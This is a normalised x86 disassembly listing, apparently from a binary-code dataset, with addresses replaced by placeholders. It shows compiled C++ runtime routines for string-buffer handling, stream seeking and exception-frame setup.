mov eax rw-data
push ebx
push esi
push edi
lea ebx [ ebp - 0x28 ]
mov edi [ ebp + 0x8 ]
call sub_4c517c
mov edx [ edi + 0x24 ]
cmp [ edx ] 0x0
je r-xdata
cmp [ edi + 0x50 ] 0x0
jne r-xdata
mov ecx [ edi + 0x24 ]
mov edx [ edi + 0x34 ]
mov eax [ ecx ]
cmp eax [ edx ]
jae r-xdata
cmp [ edi + 0x40 ] 0x0
jne r-xdata
mov ax 0xffff
mov edx [ ebp - 0x4c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
mov ecx [ edi + 0x24 ]
mov eax [ ecx ]
add [ ecx ] 0x2
mov [ ebp - 0x5c ] eax
mov edx [ ebp - 0x5c ]
mov ax [ edx ]
mov edx [ ebp - 0x4c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
mov [ ebp - 0x3c ] 0xc
lea ecx [ ebp - 0x64 ]
push ecx
call sub_408628
pop ecx
lea eax [ ebp - 0x64 ]
push eax
lea edx [ ebx + 0x8 ]
push edx
call sub_408650
add esp 0x8
mov ecx 0xf
mov [ ebx + 0x24 ] ecx
mov [ ebp - 0x65 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov ecx [ edi + 0x50 ]
mov [ ebp - 0x54 ] ecx
mov eax [ ebp - 0x54 ]
push eax
call sub_4c9e74
pop ecx
mov [ ebp - 0x56 ] ax
cmp ax 0xffff
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
mov cx [ ebp - 0x56 ]
mov dl 0x1
mov [ ebp - 0x4e ] cx
xor edx edx
jmp r-xdata
mov [ ebp - 0x81 ] al
or ecx 0xffffffff
sub ecx [ ebx + 0x20 ]
cmp ecx 0x1
ja r-xdata
mov ax 0xffff
push eax
dec [ ebp - 0x30 ]
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
xor edx edx
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x6c ]
mov cl [ ebp - 0x65 ]
mov [ eax ] cl
inc [ ebp - 0x30 ]
mov [ ebp - 0x3c ] 0x18
mov ax 0xffff
mov ax [ ebp - 0x4e ]
jmp r-xdata
test dl dl
je r-xdata
mov eax [ ebx + 0x20 ]
lea edx [ ebx + 0x8 ]
inc eax
mov [ ebp - 0x88 ] eax
push edx
mov esi eax
call sub_408880
pop ecx
mov [ ebp - 0x8c ] eax
cmp [ ebp - 0x8c ] 0x1
ja r-xdata
push ebx
call sub_4bbca8
pop ecx
mov edx 0xf
mov [ ebx + 0x24 ] edx
mov [ ebp - 0x79 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov esi [ ebx + 0x10 ]
mov edi esi
push edi
call sub_4b0180
pop ecx
mov edx [ ebp - 0x4c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
mov ecx [ ebp - 0x8c ]
dec ecx
mov ecx 0x1
jmp r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
cmp esi [ ebx + 0x24 ]
jbe r-xdata
push ebx
call sub_4bbca8
pop ecx
cmp esi ecx
jbe r-xdata
xor eax eax
mov [ ebx + 0x20 ] eax
add ecx eax
mov [ ebp - 0x80 ] ecx
mov edx [ ebp - 0x80 ]
mov cl [ ebp - 0x79 ]
mov [ edx ] cl
pop eax
mov edx [ ebp - 0x4c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
test esi esi
jne r-xdata
mov eax [ ebx + 0x20 ]
push eax
push esi
push ebx
call sub_408678
add esp 0xc
jmp r-xdata
test esi esi
seta al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0xa5 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
cmp [ ebx + 0x24 ] 0x10
mov eax [ ebx + 0x20 ]
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
lea esi [ ebx + 0x10 ]
mov esi [ ebx + 0x10 ]
jmp r-xdata
lea edx [ ebx + 0x10 ]
mov edx [ ebx + 0x10 ]
jmp r-xdata
xor edx edx
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0xac ] eax
mov eax [ ebp - 0xac ]
mov cl [ ebp - 0xa5 ]
mov [ eax ] cl
lea edx [ ebx + 0x10 ]
mov edx [ ebx + 0x10 ]
jmp r-xdata
mov [ ebp - 0x128 ] esi
mov eax [ ebp - 0x128 ]
add eax [ ebx + 0x20 ]
mov [ ebp - 0xbc ] eax
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
add edx eax
mov al [ ebp - 0x81 ]
mov [ edx ] al
mov ecx [ ebp - 0x88 ]
mov [ ebp - 0xb0 ] ecx
mov [ ebp - 0xb1 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea edx [ ebp - 0x6e ]
cmp edx [ ebp - 0x74 ]
je r-xdata
dec eax
je r-xdata
mov [ ebp - 0xc0 ] edx
lea edx [ ebp - 0x74 ]
mov eax [ ebp - 0xc0 ]
mov [ ebp - 0x138 ] eax
lea eax [ edi + 0x48 ]
mov ecx [ ebp - 0x138 ]
mov [ ebp - 0xc4 ] ecx
mov [ ebp - 0xc8 ] eax
push edx
lea ecx [ ebp - 0x6c ]
push ecx
lea eax [ ebp - 0x6e ]
push eax
lea edx [ ebp - 0x78 ]
push edx
mov ecx [ ebp - 0xbc ]
push ecx
mov eax [ ebp - 0xc4 ]
push eax
mov edx [ ebp - 0xc8 ]
push edx
mov ecx [ edi + 0x40 ]
push ecx
mov eax [ ecx ]
call [ eax + 0x10 ]
add esp 0x20
sub eax 0x2
jb r-xdata
mov edx [ ebp - 0xb0 ]
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0xb8 ] eax
mov eax [ ebp - 0xb8 ]
mov cl [ ebp - 0xb1 ]
mov [ eax ] cl
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
cmp [ ebx + 0x20 ] 0x2
jb r-xdata
jmp r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
mov eax [ edi + 0x50 ]
push eax
call sub_4c9e4c
pop ecx
mov [ ebp - 0x3c ] 0x18
cmp eax 0xffffffff
jne r-xdata
push 0x2
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov ax 0xffff
push eax
dec [ ebp - 0x30 ]
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
cmp esi [ ebx + 0x20 ]
jbe r-xdata
push ebx
call sub_4bc8cc
pop ecx
mov [ ebp - 0xe0 ] ecx
mov eax [ ebp - 0xe0 ]
mov [ ebp - 0x158 ] eax
mov edx [ ebp - 0x158 ]
mov esi [ ebp - 0x78 ]
sub esi edx
cmp [ ebx + 0x20 ] 0x0
jae r-xdata
mov ax [ ebp - 0x6e ]
push eax
dec [ ebp - 0x30 ]
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov eax [ edi + 0x50 ]
push eax
dec esi
mov edx [ ebp - 0x78 ]
movsx ecx [ edx + esi ]
push ecx
call sub_4c8874
add esp 0x8
test esi esi
jg r-xdata
mov [ ebp - 0xcc ] ecx
mov eax [ ebp - 0xcc ]
mov [ ebp - 0x148 ] eax
mov esi [ ebp - 0x148 ]
add esi [ ebx + 0x20 ]
sub esi [ ebp - 0x78 ]
test esi esi
jle r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
mov edx 0xf
mov [ ebx + 0x24 ] edx
mov [ ebp - 0x119 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov edx [ ebx + 0x10 ]
mov [ ebp - 0x114 ] edx
mov ecx [ ebp - 0x114 ]
mov [ ebp - 0x118 ] ecx
mov eax [ ebp - 0x118 ]
push eax
call sub_4b0180
pop ecx
test esi esi
jbe r-xdata
mov esi [ ebx + 0x20 ]
mov edx 0xf
mov [ ebx + 0x24 ] edx
mov [ ebp - 0xd5 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov edx [ ebx + 0x10 ]
mov [ ebp - 0xd0 ] edx
mov ecx [ ebp - 0xd0 ]
mov [ ebp - 0xd4 ] ecx
mov eax [ ebp - 0xd4 ]
push eax
call sub_4b0180
pop ecx
mov edx 0xf
mov [ ebx + 0x24 ] edx
mov [ ebp - 0x109 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov edx [ ebx + 0x10 ]
mov [ ebp - 0x104 ] edx
mov ecx [ ebp - 0x104 ]
mov [ ebp - 0x108 ] ecx
mov eax [ ebp - 0x108 ]
push eax
call sub_4b0180
pop ecx
mov [ ebp - 0x100 ] eax
mov edx [ ebp - 0x100 ]
mov [ ebp - 0x168 ] edx
mov ecx [ ebp - 0x168 ]
push ecx
lea eax [ ebp - 0x6e ]
push eax
call sub_4c4cb0
add esp 0xc
mov ax [ ebp - 0x6e ]
push eax
dec [ ebp - 0x30 ]
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
mov eax [ ebx + 0x20 ]
sub eax esi
mov [ ebp - 0xe4 ] eax
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
xor eax eax
mov [ ebx + 0x20 ] eax
add ecx eax
mov [ ebp - 0x120 ] ecx
mov edx [ ebp - 0x120 ]
mov cl [ ebp - 0x119 ]
mov [ edx ] cl
pop eax
mov edx [ ebp - 0x4c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
lea edx [ ebx + 0x10 ]
mov edx [ ebx + 0x10 ]
jmp r-xdata
xor eax eax
mov [ ebx + 0x20 ] eax
add ecx eax
mov [ ebp - 0xdc ] ecx
mov edx [ ebp - 0xdc ]
mov cl [ ebp - 0xd5 ]
mov [ edx ] cl
mov [ ebp - 0x3c ] 0x18
pop eax
mov edx [ ebp - 0x4c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
xor eax eax
mov [ ebx + 0x20 ] eax
add ecx eax
mov [ ebp - 0x110 ] ecx
mov edx [ ebp - 0x110 ]
mov cl [ ebp - 0x109 ]
mov [ edx ] cl
pop eax
mov edx [ ebp - 0x4c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
add edx esi
mov [ ebp - 0xe8 ] edx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
mov [ ebp - 0xec ] eax
mov edx [ ebp - 0xe4 ]
push edx
mov ecx [ ebp - 0xe8 ]
push ecx
mov eax [ ebp - 0xec ]
push eax
call sub_4c4cf8
add esp 0xc
mov edx [ ebx + 0x20 ]
sub edx esi
mov [ ebp - 0xf0 ] edx
mov ecx [ ebp - 0xf0 ]
mov [ ebp - 0xf4 ] ecx
mov [ ebp - 0xf5 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov edx [ ebp - 0xf4 ]
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0xfc ] eax
mov eax [ ebp - 0xfc ]
mov cl [ ebp - 0xf5 ]
mov [ eax ] cl
jmp r-xdata
sub_4c286c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi [ ebp + 0x18 ]
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov eax [ ebx + 0x24 ]
mov edx [ eax ]
lea ecx [ ebx + 0x44 ]
cmp edx ecx
jne r-xdata
cmp [ ebx + 0x50 ] 0x0
je r-xdata
cmp edi 0x1
jne r-xdata
mov edx [ rw-data ]
mov [ ebp - 0x10 ] edx
mov edx [ rw-data ]
mov [ ebp - 0xc ] edx
mov ecx [ ebp - 0x10 ]
mov [ esi ] ecx
mov ecx [ ebp - 0xc ]
mov [ esi + 0x4 ] ecx
mov eax [ rw-data ]
mov [ esi + 0x8 ] eax
mov eax esi
mov edx [ rw-data ]
mov [ esi + 0xc ] edx
jmp r-xdata
push ebx
call sub_4c0888
pop ecx
test al al
je r-xdata
cmp [ ebx + 0x40 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
sub [ ebp + 0x10 ] 0x2
sbb [ ebp + 0x14 ] 0x0
push edi
mov eax [ ebp + 0x10 ]
push eax
mov edx [ ebx + 0x50 ]
push edx
call sub_4c6b8c
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
mov eax [ ebx + 0x50 ]
push eax
call sub_4c69a0
add esp 0x8
test eax eax
je r-xdata
cmp edi 0x1
je r-xdata
lea edx [ ebx + 0x44 ]
mov ecx [ ebx + 0x24 ]
cmp edx [ ecx ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edi [ ebx + 0x48 ]
mov [ esi ] 0x0
mov eax esi
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] edi
lea ecx [ ebx + 0x44 ]
lea edx [ ebx + 0x46 ]
mov [ ebp - 0x8 ] ecx
mov eax edx
mov ecx [ ebx + 0x14 ]
mov edi [ ebp - 0x8 ]
mov [ ecx ] edi
mov ecx [ ebx + 0x24 ]
mov [ ecx ] edx
mov edx [ ebx + 0x34 ]
mov [ edx ] eax
sub_4c2964
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x4 ] ecx
mov eax ecx
cdq
add eax [ ebp + 0x10 ]
adc edx [ ebp + 0x14 ]
push edx
push eax
mov eax [ ebp - 0x4 ]
cdq
sub [ esp ] eax
sbb [ esp + 0x4 ] edx
pop eax
pop edx
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] edx
cmp [ ebx + 0x50 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov [ ebp - 0x18 ] edx
mov edx [ rw-data ]
mov [ ebp - 0x14 ] edx
mov ecx [ ebp - 0x18 ]
mov [ esi ] ecx
mov ecx [ ebp - 0x14 ]
mov [ esi + 0x4 ] ecx
mov eax [ rw-data ]
mov [ esi + 0x8 ] eax
mov eax esi
mov edx [ rw-data ]
mov [ esi + 0xc ] edx
jmp r-xdata
push ebx
call sub_4c0888
pop ecx
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x4 ]
push ecx
mov eax [ ebx + 0x50 ]
push eax
call sub_4c6c90
add esp 0x8
test eax eax
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
je r-xdata
cmp [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0x4 ]
push ecx
mov eax [ ebx + 0x50 ]
push eax
call sub_4c69a0
add esp 0x8
test eax eax
je r-xdata
push 0x1
mov eax [ ebp - 0xc ]
push eax
mov edx [ ebx + 0x50 ]
push edx
call sub_4c6b8c
add esp 0xc
test eax eax
jne r-xdata
mov edx [ ebp + 0x1c ]
mov [ ebx + 0x48 ] edx
lea ecx [ ebx + 0x44 ]
mov eax [ ebx + 0x24 ]
cmp ecx [ eax ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edi [ ebx + 0x48 ]
mov [ esi ] 0x0
mov eax esi
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] edi
lea ecx [ ebx + 0x44 ]
lea edx [ ebx + 0x46 ]
mov [ ebp - 0x10 ] ecx
mov eax edx
mov ecx [ ebx + 0x14 ]
mov edi [ ebp - 0x10 ]
mov [ ecx ] edi
mov ecx [ ebx + 0x24 ]
mov [ ecx ] edx
mov edx [ ebx + 0x34 ]
mov [ edx ] eax
sub_4c2a74
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov esi [ ebx + 0x50 ]
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov ecx edx
add ecx ecx
test eax eax
push ecx
jne r-xdata
pop esi
pop ebx
pop ebp
retn
xor edx edx
test edx edx
jne r-xdata
push 0x1
mov ecx [ ebx + 0x50 ]
push ecx
push ebx
call sub_4c0458
add esp 0xc
mov eax ebx
mov edx 0x2
jmp r-xdata
push edx
push eax
push esi
call sub_4c8280
add esp 0x10
test eax eax
je r-xdata
sub_4c2ac8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x50 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
push 0xffff
push ebx
mov eax [ ebx ]
call [ eax + 0xc ]
add esp 0x8
mov esi eax
mov di 0xffff
cmp si di
sete dl
and edx 0x1
test dl dl
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ecx [ ebx + 0x50 ]
push ecx
call sub_4c6910
pop ecx
test eax eax
jl r-xdata
or eax 0xffffffff
sub_4c2b14
push ebp
mov ebp esp
add esp 0xfffffe84
mov eax rw-data
push ebx
push esi
push edi
lea ebx [ ebp - 0x38 ]
mov esi [ ebp + 0x8 ]
call sub_4c517c
mov edx [ ebp + 0xc ]
xor ecx ecx
mov [ ebp - 0xc0 ] edx
mov [ ebp - 0xac ] 0x18
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4c3b24
pop ecx
cmp [ ebp - 0x4 ] 0x3
jne r-xdata
mov eax [ rw-data ]
mov [ ebp - 0xc8 ] eax
mov edx [ ebp - 0xc8 ]
push edx
mov ecx [ ebp - 0xc0 ]
push ecx
call sub_4b9c80
add esp 0x8
mov [ ebp - 0xcc ] eax
cmp [ ebp - 0xcc ] 0x0
jne r-xdata
mov [ ebp - 0xac ] 0x24
xor ecx ecx
mov [ ebp - 0xc ] ecx
cmp [ ebp - 0xc ] 0x1
je r-xdata
inc [ ebp - 0xa0 ]
mov edx [ rw-data ]
mov [ ebp - 0xc4 ] edx
cmp [ rw-data ] 0x0
jne r-xdata
mov edx [ ebp - 0xcc ]
push edx
dec [ ebp - 0xa0 ]
cmp [ ebp - 0x4 ] 0x1
je r-xdata
cmp [ ebp - 0xc4 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
push eax
call sub_4c3b24
pop ecx
cmp [ ebp - 0xc ] 0x3
jne r-xdata
mov ecx [ ebp - 0x4 ]
push ecx
call sub_4c3b58
pop ecx
cmp [ ebp - 0x4 ] 0x3
jne r-xdata
lea edx [ ebp - 0xc4 ]
test edx edx
je r-xdata
mov eax [ ebp - 0xc4 ]
mov [ ebp - 0xcc ] eax
jmp r-xdata
dec [ ebp - 0xa0 ]
cmp [ ebp - 0xc ] 0x1
je r-xdata
inc [ rw-data ]
mov edx [ rw-data ]
mov [ rw-data ] edx
inc [ ebp - 0xa0 ]
cmp [ rw-data ] 0x0
jne r-xdata
mov [ esi + 0x40 ] ebx
lea ecx [ esi + 0xc ]
mov [ esi + 0x14 ] ecx
lea eax [ esi + 0x10 ]
mov [ esi + 0x18 ] eax
lea edx [ esi + 0x1c ]
mov [ esi + 0x24 ] edx
lea ecx [ esi + 0x20 ]
mov [ esi + 0x28 ] ecx
lea eax [ esi + 0x2c ]
mov [ esi + 0x34 ] eax
lea edx [ esi + 0x30 ]
mov [ esi + 0x38 ] edx
mov ecx [ esi + 0x18 ]
xor eax eax
mov [ ecx ] eax
mov edx [ esi + 0x28 ]
xor ecx ecx
mov [ edx ] ecx
mov eax [ esi + 0x38 ]
xor edx edx
mov [ eax ] edx
mov ecx [ esi + 0x14 ]
xor eax eax
mov [ ecx ] eax
mov edx [ esi + 0x24 ]
xor ecx ecx
mov [ edx ] ecx
mov eax [ esi + 0x34 ]
xor edx edx
mov [ eax ] edx
xor edx edx
mov [ esi + 0x40 ] edx
jmp r-xdata
pop eax
mov [ ebp - 0xac ] 0xc
mov ebx eax
push ebx
call sub_4b93ac
pop ecx
test al al
je r-xdata
mov eax 0x1
cmp eax 0xffffffff
jne r-xdata
cmp [ ebp - 0xc4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
push ecx
call sub_4c3b58
pop ecx
cmp [ ebp - 0xc ] 0x3
jne r-xdata
mov ecx [ ebp - 0xbc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xc4 ]
mov [ ebp - 0xcc ] ecx
mov eax [ ebp - 0xc4 ]
mov edx [ ebp - 0xc4 ]
mov [ ebp - 0x17c ] edx
mov [ rw-data ] eax
mov ecx [ ebp - 0x17c ]
add ecx 0x4
push ecx
call sub_4c3b78
pop ecx
mov eax [ ebp - 0x17c ]
push eax
call sub_4ba37c
pop ecx
lea edx [ ebp - 0xbc ]
push edx
push 0x0
push 0x0
push 0x0
push 0x1
push r-xdata
push 0x0
lea ecx [ ebp - 0x8 ]
push ecx
call sub_4088ac
pop ecx
mov eax rw-data
inc [ ebp - 0xa0 ]
mov [ ebp - 0x8 ] eax
inc [ ebp - 0xa0 ]
lea edx [ ebp - 0x8 ]
push edx
push r-xdata
call sub_4d1c20
add esp 0x24
jmp r-xdata
push 0x10
call sub_4bbbac
pop ecx
mov [ ebp - 0x10 ] eax
test eax eax
je r-xdata
mov [ ebp - 0xac ] 0x18
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0xac ] 0x54
mov edx [ ebp - 0xc0 ]
mov ecx [ edx + 0x8 ]
add ecx 0x18
mov [ ebp - 0xd4 ] ecx
mov eax [ ebp - 0xd4 ]
add eax 0x8
push eax
lea edx [ ebp - 0xdc ]
push edx
call sub_408650
add esp 0x8
lea ecx [ ebp - 0xdc ]
push ecx
lea eax [ ebx + 0x8 ]
push eax
call sub_408650
add esp 0x8
mov edx 0xf
mov [ ebx + 0x24 ] edx
mov [ ebp - 0xdd ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov ecx 0xf
mov [ ebx + 0x24 ] ecx
mov [ ebp - 0x171 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov edx [ ebx + 0x10 ]
mov [ ebp - 0x16c ] edx
mov eax [ ebp - 0x16c ]
mov [ ebp - 0x170 ] eax
mov edx [ ebp - 0x170 ]
push edx
call sub_4b0180
pop ecx
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
mov edx [ ebp - 0xd4 ]
mov ecx [ edx + 0x20 ]
mov [ ebp - 0xe8 ] ecx
cmp [ ebp - 0xe8 ] 0xffffffff
jbe r-xdata
push ebx
call sub_4bc8cc
pop ecx
xor eax eax
mov [ ebx + 0x20 ] eax
add ecx eax
mov [ ebp - 0xe4 ] ecx
mov edx [ ebp - 0xe4 ]
mov cl [ ebp - 0xdd ]
mov [ edx ] cl
mov eax [ ebp - 0xd4 ]
cmp [ eax + 0x20 ] 0x0
jae r-xdata
xor edx edx
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0x178 ] eax
mov eax [ ebp - 0x178 ]
mov cl [ ebp - 0x171 ]
mov [ eax ] cl
mov [ ebp - 0xac ] 0x18
cmp ebx [ ebp - 0xd4 ]
jne r-xdata
mov [ ebp - 0xe8 ] 0xffffffff
mov edi [ ebp - 0xe8 ]
lea eax [ ebx + 0x8 ]
push eax
call sub_408880
pop ecx
mov [ ebp - 0x130 ] eax
cmp [ ebp - 0x130 ] 0x1
ja r-xdata
mov [ ebp - 0xec ] 0xffffffff
mov eax [ ebp - 0xe8 ]
mov [ ebp - 0xf0 ] eax
mov edx [ ebx + 0x20 ]
cmp edx [ ebp - 0xf0 ]
jae r-xdata
mov edx [ ebp - 0x130 ]
dec edx
mov edx 0x1
jmp r-xdata
mov ecx [ ebx + 0x20 ]
sub ecx [ ebp - 0xf0 ]
cmp ecx [ ebp - 0xec ]
jae r-xdata
push ebx
call sub_4bc8cc
pop ecx
cmp edi [ ebx + 0x24 ]
jbe r-xdata
push ebx
call sub_4bbca8
pop ecx
cmp edi edx
jbe r-xdata
cmp [ ebp - 0xec ] 0x0
jbe r-xdata
mov eax [ ebx + 0x20 ]
sub eax [ ebp - 0xf0 ]
mov [ ebp - 0xec ] eax
test edi edi
jne r-xdata
mov eax [ ebx + 0x20 ]
push eax
push edi
push ebx
call sub_408678
add esp 0xc
jmp r-xdata
xor eax eax
mov [ ebp - 0x110 ] eax
cmp [ ebx + 0x20 ] 0x0
jae r-xdata
mov edx [ ebx + 0x20 ]
sub edx [ ebp - 0xf0 ]
sub edx [ ebp - 0xec ]
mov [ ebp - 0xf4 ] edx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
test edi edi
seta al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0x149 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov edx [ ebx + 0x20 ]
cmp edx [ ebp - 0x110 ]
jae r-xdata
push ebx
call sub_4bc8cc
pop ecx
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
inc [ ebp - 0xa0 ]
push ebx
inc [ ebp - 0xa0 ]
lea eax [ ebp - 0x98 ]
push eax
call sub_4bab6c
add [ ebp - 0xa0 ] 0x4
mov [ ebp - 0xd0 ] eax
mov edx rw-data
mov ecx [ ebp - 0x10 ]
add esp 0x8
mov [ ecx ] edx
xor edx edx
mov eax [ ebp - 0x10 ]
mov ecx rw-data
mov [ eax + 0x4 ] edx
mov edx rw-data
inc [ ebp - 0xa0 ]
mov eax [ ebp - 0x10 ]
mov [ eax ] ecx
inc [ ebp - 0xa0 ]
mov ecx [ ebp - 0x10 ]
mov [ ecx ] edx
mov eax [ ebp - 0xd0 ]
push eax
mov edx [ ebp - 0x10 ]
add edx 0x8
push edx
call sub_4b9748
add esp 0x8
add [ ebp - 0xa0 ] 0xfffffffe
mov [ ebp - 0xac ] 0x3c
mov ecx [ ebp - 0x10 ]
jmp r-xdata
mov edx [ ebp - 0xe8 ]
mov [ ebp - 0x154 ] edx
mov ecx [ ebp - 0xd4 ]
cmp [ ecx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x110 ] 0x0
jbe r-xdata
mov ecx [ ebx + 0x20 ]
mov [ ebp - 0x110 ] ecx
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
add ecx [ ebp - 0xf0 ]
add ecx [ ebp - 0xec ]
mov [ ebp - 0xf8 ] ecx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov [ ebp - 0xc4 ] ecx
sub [ ebp - 0xa0 ] 0x4
push 0x2
lea eax [ ebp - 0x98 ]
push eax
call sub_4bb8e4
add esp 0x8
dec [ ebp - 0xa0 ]
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov edx [ ebp - 0xd4 ]
add edx 0x10
mov eax [ ebp - 0xd4 ]
mov edx [ eax + 0x10 ]
jmp r-xdata
xor edx edx
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0x150 ] eax
mov eax [ ebp - 0x150 ]
mov cl [ ebp - 0x149 ]
mov [ eax ] cl
mov eax [ ebx + 0x20 ]
sub eax [ ebp - 0x110 ]
mov [ ebp - 0x114 ] eax
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
add eax [ ebp - 0xf0 ]
mov [ ebp - 0xfc ] eax
mov edx [ ebp - 0xf4 ]
push edx
mov ecx [ ebp - 0xf8 ]
push ecx
mov eax [ ebp - 0xfc ]
push eax
call sub_4c4cf8
add esp 0xc
mov edx [ ebx + 0x20 ]
sub edx [ ebp - 0xec ]
mov [ ebp - 0x100 ] edx
mov ecx [ ebp - 0x100 ]
mov [ ebp - 0x104 ] ecx
mov [ ebp - 0x105 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
mov [ ebp - 0x158 ] edx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea edx [ ebx + 0x10 ]
mov edx [ ebx + 0x10 ]
jmp r-xdata
mov edx [ ebp - 0x104 ]
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0x10c ] eax
mov eax [ ebp - 0x10c ]
mov cl [ ebp - 0x105 ]
mov [ eax ] cl
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
mov [ ebp - 0x15c ] eax
mov edx [ ebp - 0x154 ]
push edx
mov ecx [ ebp - 0x158 ]
push ecx
mov eax [ ebp - 0x15c ]
push eax
call sub_4c4cb0
add esp 0xc
mov edx [ ebp - 0xe8 ]
mov [ ebp - 0x160 ] edx
